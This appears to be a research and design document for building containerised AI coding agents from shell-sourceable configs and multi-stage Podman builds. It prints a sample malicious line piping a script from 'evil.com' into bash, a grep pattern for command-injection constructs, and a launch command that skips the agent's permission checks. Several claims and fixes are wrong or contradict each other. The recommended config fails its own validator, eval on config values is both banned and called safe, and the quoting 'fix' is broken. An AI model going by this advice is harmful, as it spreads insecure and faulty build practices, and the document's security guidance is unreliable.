# Phase 2: Agent Abstraction - Research

**Researched:** 2026-01-26
**Domain:** Config-driven architecture with shell-sourceable configs and multi-stage container builds
**Confidence:** HIGH

## Summary

Agent abstraction requires implementing a config-driven architecture where agent definitions live in shell-sourceable config files, integrated with multi-stage Containerfile builds using build-time ARG injection. The standard approach uses KEY=value format configs that can be safely sourced in bash scripts, combined with Podman/Docker multi-stage builds that share a common base stage and branch into agent-specific stages selected via --target flag.

Research revealed that shell-sourceable configs require strict security controls to prevent code execution vulnerabilities, particularly avoiding command substitution and properly validating config contents before sourcing. Multi-stage builds in Podman/Docker are well-established patterns with strong BuildKit optimization support, and ARG/build-arg mechanisms provide clean build-time parameterization.

XDG-style config layering follows established precedence rules where user configs override repo defaults, with clear specification from freedesktop.org. The primary risks involve config validation security (regex bypasses, injection attacks) and multi-stage build pitfalls (hardcoded secrets, running as root, unnecessarily large images).

**Primary recommendation:** Use shell-sourceable KEY=value configs with strict validation (only variable expansion, no command substitution), implement multi-stage Containerfile with shared base stage, validate required fields before sourcing, and follow XDG precedence (user overrides repo defaults).

## Standard Stack

The established tools and patterns for this domain:

### Core
| Tool | Version | Purpose | Why Standard |
|------|---------|---------|--------------|
| Bash | 5.2+ | Config parsing and validation | Universal shell on Linux systems, native sourcing support |
| Podman | 5.3+ | Container builds | Docker-compatible, rootless by default, native on RHEL/Fedora |
| Docker BuildKit | Latest | Multi-stage optimization | Automatic in modern Docker/Podman, parallel stage building |

### Supporting
| Pattern | Purpose | When to Use |
|---------|---------|-------------|
| Shell-sourceable configs | KEY=value format configs | When bash scripts need to load config directly |
| Multi-stage builds | Shared base + agent-specific stages | When multiple similar containers need common foundation |
| Build-time ARG | Pass config values to Containerfile | When container build needs parameterization |
| XDG Base Directory | Config file layering | When supporting both repo defaults and user overrides |

### Alternatives Considered
| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| Shell-sourceable | JSON/YAML + jq | More structured but requires external parser, slower |
| Multi-stage builds | Separate Containerfiles | Simpler but duplicates base stage, harder to maintain |
| Build-time ARG | Runtime ENV | More flexible but less optimized, can't affect build steps |
| XDG layering | Single config location | Simpler but no user customization without editing repo |

**Installation:**
```bash
# Standard on most Linux distributions
bash --version  # Should be 5.2+
podman --version  # Install via dnf/apt if missing
```

## Architecture Patterns

### Recommended Project Structure
```
agent-session/
├── config/
│   └── agents/           # Repo default agent configs
│       ├── claude/
│       │   └── config.conf
│       └── opencode/
│           └── config.conf
├── Containerfile         # Multi-stage build with base + agent stages
└── scripts/
    ├── build.sh          # Validates config, builds with --target
    └── validate-config.sh # Config field validation

User overrides:
~/.config/agent-session/
└── agents/               # User custom agent configs (higher precedence)
    └── claude/
        └── config.conf
```

### Pattern 1: Shell-Sourceable Config Format

**What:** KEY=value format that bash can source directly, with only variable expansion (no command substitution)

**When to use:** When bash scripts need to read config values efficiently without external parsers

**Example:**
```bash
# Source: Shell scripting best practices
# config/agents/claude/config.conf

# Required metadata
AGENT_NAME="claude"
AGENT_DESCRIPTION="Anthropic Claude Code agent"

# Installation
AGENT_INSTALL_CMD="curl -fsSL https://claude.ai/install.sh | bash"

# Launch configuration
AGENT_LAUNCH_CMD="claude --dangerously-skip-permissions"
AGENT_SHELL="/usr/bin/fish"

# Multi-line values: space-separated, parsed with IFS
AGENT_REQUIRED_MOUNTS="/workspace /config/.claude /config/zellij"
AGENT_ENV_VARS="PATH=/home/agent/.local/bin:$PATH SHELL=/usr/bin/fish"
```

**Validation before sourcing:**
```bash
# Source: Bash Hackers Wiki - Config files
validate_config() {
    local config_file="$1"

    # Check file exists and is readable
    if [[ ! -f "$config_file" ]] || [[ ! -r "$config_file" ]]; then
        echo "Error: Config file not found or not readable: $config_file" >&2
        return 1
    fi

    # Validate only KEY=value format (no command substitution)
    # Allow: variable expansion ($VAR, ${VAR}), comments (#)
    # Reject: command substitution ($(), ``), pipes, semicolons
    if grep -E '`|\$\(|;|\||&' "$config_file" > /dev/null; then
        echo "Error: Config contains forbidden constructs (command substitution)" >&2
        return 1
    fi

    return 0
}

# Usage
if validate_config "agents/claude/config.conf"; then
    source "agents/claude/config.conf"
else
    exit 1
fi
```

### Pattern 2: XDG-Style Config Layering

**What:** Load repo defaults first, then override with user configs if present

**When to use:** When supporting both project-provided defaults and user customization

**Example:**
```bash
# Source: XDG Base Directory Specification - https://specifications.freedesktop.org/basedir/latest/

load_agent_config() {
    local agent_name="$1"
    local config_home="${XDG_CONFIG_HOME:-$HOME/.config}"

    # Precedence order (first found wins for overrides):
    # 1. User config (highest priority)
    # 2. Repo default (fallback)

    local user_config="$config_home/agent-session/agents/$agent_name/config.conf"
    local repo_config="./config/agents/$agent_name/config.conf"

    # Load repo defaults first
    if [[ -f "$repo_config" ]]; then
        validate_config "$repo_config" || return 1
        source "$repo_config"
    else
        echo "Error: No default config for agent: $agent_name" >&2
        return 1
    fi

    # Override with user config if present
    if [[ -f "$user_config" ]]; then
        validate_config "$user_config" || return 1
        source "$user_config"
    fi

    return 0
}
```

### Pattern 3: Multi-Stage Containerfile with Shared Base

**What:** Single Containerfile with base stage + agent-specific stages, built with --target flag

**When to use:** When multiple agent containers share common dependencies but have agent-specific setup

**Example:**
```dockerfile
# Source: Docker multi-stage build docs - https://docs.docker.com/build/building/multi-stage/

# ===== BASE STAGE (shared by all agents) =====
FROM --platform=linux/amd64 debian:bookworm-slim AS base

# Install common tools
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
    git \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

# Create non-root user (UID 1000 to match typical host)
RUN useradd -m -u 1000 agent

# Common entrypoint
COPY --chmod=755 entrypoint.sh /entrypoint.sh

USER agent
WORKDIR /workspace

# ===== CLAUDE AGENT STAGE =====
FROM base AS claude

# Accept build args from config
ARG AGENT_INSTALL_CMD
ARG AGENT_SHELL
ARG AGENT_LAUNCH_CMD

# Install agent-specific tools
RUN eval "$AGENT_INSTALL_CMD"

# Set agent-specific environment
ENV SHELL="$AGENT_SHELL"
ENV PATH="/home/agent/.local/bin:$PATH"

# Create agent launcher
RUN printf '#!/bin/bash\n%s\nexec %s\n' \
    "$AGENT_LAUNCH_CMD" \
    "$AGENT_SHELL" \
    > ~/.local/bin/agent-session && chmod +x ~/.local/bin/agent-session

ENTRYPOINT ["/entrypoint.sh"]
CMD ["agent-session"]

# ===== FUTURE AGENT STAGES =====
FROM base AS opencode
# ... similar pattern
```

**Build with config injection:**
```bash
# Source: Podman build documentation - https://docs.podman.io/en/v5.3.2/markdown/podman-build.1.html

# Load config and build
source "config/agents/claude/config.conf"

podman build \
    --target=claude \
    --build-arg AGENT_INSTALL_CMD="$AGENT_INSTALL_CMD" \
    --build-arg AGENT_SHELL="$AGENT_SHELL" \
    --build-arg AGENT_LAUNCH_CMD="$AGENT_LAUNCH_CMD" \
    -t agent-session-claude:latest \
    .
```

### Pattern 4: Required Field Validation

**What:** Check all required config fields are non-empty before proceeding

**When to use:** After loading config, before using values in build or run commands

**Example:**
```bash
# Source: Bash variable validation patterns
validate_required_fields() {
    local required_fields=(
        "AGENT_NAME"
        "AGENT_DESCRIPTION"
        "AGENT_INSTALL_CMD"
        "AGENT_LAUNCH_CMD"
        "AGENT_SHELL"
    )

    local missing=()

    for field in "${required_fields[@]}"; do
        if [[ -z "${!field}" ]]; then
            missing+=("$field")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        echo "Error: Missing required config fields:" >&2
        printf '  - %s\n' "${missing[@]}" >&2
        return 1
    fi

    return 0
}

# Usage after sourcing config
load_agent_config "claude" || exit 1
validate_required_fields || exit 1
```

### Pattern 5: Containerfile Stage Existence Check

**What:** Verify that a Containerfile stage exists before attempting build

**When to use:** Before running podman build --target, to fail early with clear error

**Example:**
```bash
# Source: Pattern adapted from dockerfile-validator approaches
validate_stage_exists() {
    local containerfile="$1"
    local stage_name="$2"

    # Check if "FROM ... AS <stage_name>" exists in Containerfile
    if ! grep -qE "^FROM .* AS ${stage_name}\$" "$containerfile"; then
        echo "Error: Stage '$stage_name' not found in $containerfile" >&2
        echo "Available stages:" >&2
        grep -E '^FROM .* AS ' "$containerfile" | sed 's/^FROM .* AS /  - /' >&2
        return 1
    fi

    return 0
}

# Usage before build
validate_stage_exists "Containerfile" "$AGENT_NAME" || exit 1
```

### Anti-Patterns to Avoid

- **Sourcing config without validation:** Always validate config format before sourcing to prevent code execution
- **Using eval with config values:** Never use `eval` with user-provided config values, use direct variable expansion only
- **Hardcoding secrets in configs:** Use runtime environment or BuildKit secrets, never commit secrets to config files
- **Building all stages when only one needed:** Always use --target to build specific agent stage
- **Running containers as root:** Always switch to non-root user in Containerfile
- **Forgetting to clean up in RUN commands:** Chain commands with && and clean package caches in same RUN layer

## Don't Hand-Roll

Problems that look simple but have existing solutions:

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| Config file parsing | Custom parser with regex | Shell sourcing with validation | Native bash feature, faster, handles variable expansion correctly |
| XDG directory lookup | Manual path checking | XDG Base Directory spec pattern | Standardized precedence rules, ecosystem compatibility |
| Multi-stage build optimization | Manual COPY --from | BuildKit automatic optimization | BuildKit skips unused stages, builds in parallel automatically |
| Variable expansion in configs | String replacement | Native bash variable expansion | Handles ${VAR:-default}, nested expansions, parameter substitution |
| Container stage validation | Parse Dockerfile with awk | grep with regex pattern | Simpler, reliable, handles AS clause correctly |

**Key insight:** Shell scripting and container builds have well-established patterns that handle edge cases. Custom solutions miss subtle issues like proper quoting, word splitting, variable expansion rules, and BuildKit optimizations.

## Common Pitfalls

### Pitfall 1: Command Substitution in Sourced Configs

**What goes wrong:** Config file contains $() or backticks, executing arbitrary code when sourced

**Why it happens:** Shell sourcing executes all bash syntax, including command substitution and pipes

**How to avoid:**
- Validate config file with grep before sourcing: `grep -E '`|\$\(|;|\||&' config.conf`
- Only allow simple KEY=value and variable expansion ($VAR, ${VAR})
- Use strict validation function that rejects forbidden constructs

**Warning signs:**
- Config values contain $(...) or `...`
- Grep validation returns matches for forbidden patterns
- Unexpected commands executing during config load

**Example of vulnerability:**
```bash
# DANGEROUS - DO NOT DO THIS
# config.conf contains:
AGENT_NAME="claude"
AGENT_INSTALL_CMD="curl evil.com/malware.sh | bash"  # Executes on source!

# Safer approach:
validate_config config.conf || exit 1  # Fails before sourcing
```

### Pitfall 2: Unquoted Variable Expansion

**What goes wrong:** Variable values containing spaces or wildcards expand unexpectedly, breaking commands or exposing security issues

**Why it happens:** Bash performs word splitting and glob expansion on unquoted variables

**How to avoid:**
- Always quote variable expansions: "$variable" not $variable
- Use shellcheck to detect unquoted variables
- Treat unquoted expansions as suspicious

**Warning signs:**
- Commands fail when values contain spaces
- Filenames with * or ? cause unexpected behavior
- Arguments get split into multiple words

**Example:**
```bash
# WRONG
build_arg=--build-arg INSTALL_CMD=$AGENT_INSTALL_CMD
podman build $build_arg .  # Breaks if AGENT_INSTALL_CMD has spaces

# CORRECT
build_arg="--build-arg INSTALL_CMD=$AGENT_INSTALL_CMD"
podman build "$build_arg" .  # Safe
```

### Pitfall 3: Missing Stage in Multi-Stage Build

**What goes wrong:** Build script tries --target=stage that doesn't exist, podman fails with cryptic error after starting build

**Why it happens:** Config defines agent but corresponding Containerfile stage not created yet

**How to avoid:**
- Validate stage exists before podman build
- Use grep to check for "FROM ... AS stage_name" in Containerfile
- Fail early with clear error listing available stages

**Warning signs:**
- Podman error: "failed to find stage" after build starts
- New agent config added but build fails
- No "FROM ... AS agent_name" in Containerfile

**Example validation:**
```bash
if ! grep -qE "^FROM .* AS ${AGENT_NAME}\$" Containerfile; then
    echo "Error: Stage '$AGENT_NAME' not found in Containerfile"
    echo "Available stages:"
    grep -E '^FROM .* AS ' Containerfile | sed 's/^FROM .* AS /  - /'
    exit 1
fi
```

### Pitfall 4: XDG Precedence Confusion

**What goes wrong:** User config gets loaded first, then repo default overwrites user customizations

**Why it happens:** Loading order reversed - should load defaults first, then overrides

**How to avoid:**
- Always load repo default first: `source repo/config.conf`
- Then load user override: `source ~/.config/app/config.conf`
- Remember: later source overwrites earlier values

**Warning signs:**
- User customizations don't take effect
- Config values revert to defaults unexpectedly
- User reports "my config is ignored"

**Example:**
```bash
# WRONG ORDER - user config gets overwritten
[[ -f "$user_config" ]] && source "$user_config"
[[ -f "$repo_config" ]] && source "$repo_config"  # Overwrites user!

# CORRECT ORDER - user config overrides defaults
[[ -f "$repo_config" ]] && source "$repo_config"
[[ -f "$user_config" ]] && source "$user_config"  # Overrides repo
```

### Pitfall 5: ARG Values Not Quoted in Containerfile

**What goes wrong:** Build-arg values with spaces get split, causing RUN commands to fail

**Why it happens:** ARG values used without quotes in RUN commands

**How to avoid:**
- Always quote ARG variables in RUN commands: "$AGENT_INSTALL_CMD"
- Test with config values that contain spaces
- Use shellcheck on inline scripts

**Warning signs:**
- Build succeeds with simple values but fails with complex ones
- RUN command errors show truncated arguments
- Spaces in install commands cause "command not found"

**Example:**
```dockerfile
# WRONG
ARG AGENT_INSTALL_CMD
RUN $AGENT_INSTALL_CMD  # Breaks if value has spaces

# CORRECT
ARG AGENT_INSTALL_CMD
RUN eval "$AGENT_INSTALL_CMD"  # Safe (eval needed for complex commands)
# OR for simple commands:
RUN "$AGENT_INSTALL_CMD"
```

### Pitfall 6: Forgetting to Clean Package Caches

**What goes wrong:** Container images bloat with unnecessary package manager caches

**Why it happens:** RUN apt-get install creates cache in same layer but cleanup in different RUN command doesn't reduce size

**How to avoid:**
- Chain install and cleanup in single RUN: `RUN apt-get update && apt-get install -y pkg && rm -rf /var/lib/apt/lists/*`
- Clean up in same layer as installation
- Use --no-install-recommends to minimize packages

**Warning signs:**
- Image size much larger than expected
- Multiple RUN commands for package installation
- Build cache grows over time

**Example:**
```dockerfile
# WRONG - cache persists in image
RUN apt-get update
RUN apt-get install -y curl
RUN rm -rf /var/lib/apt/lists/*  # Too late, already in previous layers

# CORRECT - cleanup in same layer
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
    && rm -rf /var/lib/apt/lists/*
```

## Code Examples

Verified patterns from official sources:

### Complete Build Script with Validation

```bash
#!/bin/bash
# Source: Aggregated from bash best practices and Podman documentation
set -euo pipefail

AGENT_NAME="${1:-}"
if [[ -z "$AGENT_NAME" ]]; then
    echo "Usage: $0 <agent-name>" >&2
    exit 1
fi

# Validate config file format
validate_config() {
    local config_file="$1"

    [[ ! -f "$config_file" ]] && {
        echo "Error: Config not found: $config_file" >&2
        return 1
    }

    # Reject command substitution, pipes, semicolons
    if grep -E '`|\$\(|;|\||&' "$config_file" > /dev/null; then
        echo "Error: Config contains forbidden constructs" >&2
        return 1
    fi

    return 0
}

# Load config with XDG precedence
load_agent_config() {
    local agent="$1"
    local config_home="${XDG_CONFIG_HOME:-$HOME/.config}"
    local user_config="$config_home/agent-session/agents/$agent/config.conf"
    local repo_config="./config/agents/$agent/config.conf"

    # Load repo default first
    [[ ! -f "$repo_config" ]] && {
        echo "Error: No config for agent: $agent" >&2
        return 1
    }
    validate_config "$repo_config" || return 1
    source "$repo_config"

    # Override with user config if present
    if [[ -f "$user_config" ]]; then
        validate_config "$user_config" || return 1
        source "$user_config"
    fi

    return 0
}

# Validate required fields
validate_required_fields() {
    local fields=("AGENT_NAME" "AGENT_INSTALL_CMD" "AGENT_SHELL" "AGENT_LAUNCH_CMD")
    local missing=()

    for field in "${fields[@]}"; do
        [[ -z "${!field}" ]] && missing+=("$field")
    done

    [[ ${#missing[@]} -gt 0 ]] && {
        echo "Error: Missing required fields:" >&2
        printf '  - %s\n' "${missing[@]}" >&2
        return 1
    }

    return 0
}

# Validate stage exists in Containerfile
validate_stage_exists() {
    local stage="$1"

    if ! grep -qE "^FROM .* AS ${stage}\$" Containerfile; then
        echo "Error: Stage '$stage' not found in Containerfile" >&2
        echo "Available stages:" >&2
        grep -E '^FROM .* AS ' Containerfile | sed 's/^FROM .* AS /  - /' >&2
        return 1
    fi

    return 0
}

# Main build process
main() {
    echo "Building agent: $AGENT_NAME"

    # Load and validate config
    load_agent_config "$AGENT_NAME" || exit 1
    validate_required_fields || exit 1

    # Validate stage exists
    validate_stage_exists "$AGENT_NAME" || exit 1

    # Build with config injection
    echo "Building container with target: $AGENT_NAME"
    podman build \
        --target="$AGENT_NAME" \
        --build-arg AGENT_INSTALL_CMD="$AGENT_INSTALL_CMD" \
        --build-arg AGENT_SHELL="$AGENT_SHELL" \
        --build-arg AGENT_LAUNCH_CMD="$AGENT_LAUNCH_CMD" \
        -t "agent-session-${AGENT_NAME}:latest" \
        .

    echo "Build complete: agent-session-${AGENT_NAME}:latest"
}

main
```

### Multi-Line Config Value Parsing

```bash
# Source: Bash IFS-based parsing pattern
# config.conf:
AGENT_REQUIRED_MOUNTS="/workspace /config/.claude /config/zellij"

# Parse into array:
source config.conf
IFS=' ' read -ra MOUNTS <<< "$AGENT_REQUIRED_MOUNTS"

# Use in commands:
for mount in "${MOUNTS[@]}"; do
    echo "Would mount: $mount"
done
```

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| Separate Containerfiles | Multi-stage builds | Docker 17.05 (2017) | Eliminates duplication, enables --target optimization |
| BuildKit opt-in | BuildKit default | Docker 23.0 (2023), Podman native | Parallel builds, automatic stage skipping |
| JSON/YAML configs parsed with jq | Shell-sourceable configs | Ongoing preference | Faster, no dependencies, native variable expansion |
| Runtime ENV for all config | Build-time ARG for build config | Docker 1.9 (2015) | Better image optimization, clear separation |
| Manual validation scripts | Docker Build Checks | Docker 24.0 (2023) | Automated best practice enforcement |
| Root containers | Rootless by default | Podman 1.0 (2019) | Improved security posture |

**Deprecated/outdated:**
- `ENV` for build-time values: Use ARG instead, ENV persists in image unnecessarily
- Building all stages: Use --target, BuildKit automatically skips unused stages
- Sourcing without validation: Always validate before sourcing to prevent code injection
- Global-only config: Use XDG layering to support user customization

## Open Questions

Things that couldn't be fully resolved:

1. **Config format for complex multi-line values**
   - What we know: Space-separated works for simple lists, IFS parsing handles it
   - What's unclear: Best practice for multi-line scripts or complex nested structures
   - Recommendation: Use space-separated for simple lists, consider separate script files for complex multi-line content

2. **ARG scope in multi-stage builds**
   - What we know: ARG must be redeclared in each stage that uses it (after FROM)
   - What's unclear: Whether to declare all ARGs in base stage or only in agent stages
   - Recommendation: Declare in agent-specific stages only, keeps base stage parameter-free

3. **Error message verbosity**
   - What we know: Clear errors help debugging, but too verbose clutters output
   - What's unclear: Optimal balance between helpful and overwhelming
   - Recommendation: Show immediate error + hint, suggest --verbose flag for full details

## Sources

### Primary (HIGH confidence)
- [Podman Build Documentation](https://docs.podman.io/en/v5.3.2/markdown/podman-build.1.html) - Official ARG, --target, and build-arg documentation
- [XDG Base Directory Specification](https://specifications.freedesktop.org/basedir/latest/) - Official config precedence rules
- [Docker Multi-Stage Builds](https://docs.docker.com/build/building/multi-stage/) - Official multi-stage build patterns
- [Bash Hackers Wiki - Config Files](https://flokoe.github.io/bash-hackers-wiki/howto/conffile/) - Shell config file security patterns

### Secondary (MEDIUM confidence)
- [Parsing Config Files with Bash](https://opensource.com/article/21/6/bash-config) - Sourcing approach and validation
- [Docker Build Variables](https://docs.docker.com/build/building/variables/) - ARG and ENV distinction
- [How to Use Bash Parameter Substitution](https://www.cyberciti.biz/tips/bash-shell-parameter-substitution-2.html) - Variable expansion patterns
- [Container Anti-Patterns](https://dev.to/idsulik/container-anti-patterns-common-docker-mistakes-and-how-to-avoid-them-4129) - Multi-stage build pitfalls
- [Advanced Multi-Stage Build Patterns](https://medium.com/@tonistiigi/advanced-multi-stage-build-patterns-6f741b852fae) - BuildKit optimization

### Secondary (MEDIUM confidence) - Security
- [Shell Script Security](https://developer.apple.com/library/archive/documentation/OpenSource/Conceptual/ShellScripting/ShellScriptSecurity/ShellScriptSecurity.html) - Command substitution risks
- [How to Handle Secrets on the Command Line](https://smallstep.com/blog/command-line-secrets/) - Secret management best practices
- [Pwning Claude Code in 8 Different Ways](https://flatt.tech/research/posts/pwning-claude-code-in-8-different-ways/) - Regex validation bypass examples (CVE-2025-66032)

### Tertiary (LOW confidence)
- Various WebSearch results about bash validation patterns - Cross-referenced with official documentation
- Community blog posts about Docker best practices - Verified against official docs

## Metadata

**Confidence breakdown:**
- Standard stack: HIGH - Bash, Podman, Docker are well-established with official documentation
- Architecture patterns: HIGH - Multi-stage builds, ARG injection, XDG layering all have official specs
- Security pitfalls: HIGH - Command substitution risks documented in multiple authoritative sources, CVE confirms validation bypass issues
- Config validation: MEDIUM - Patterns widely used but exact regex varies by implementation

**Research date:** 2026-01-26
**Valid until:** 2026-03-26 (60 days - stable domain with slow-changing specifications)
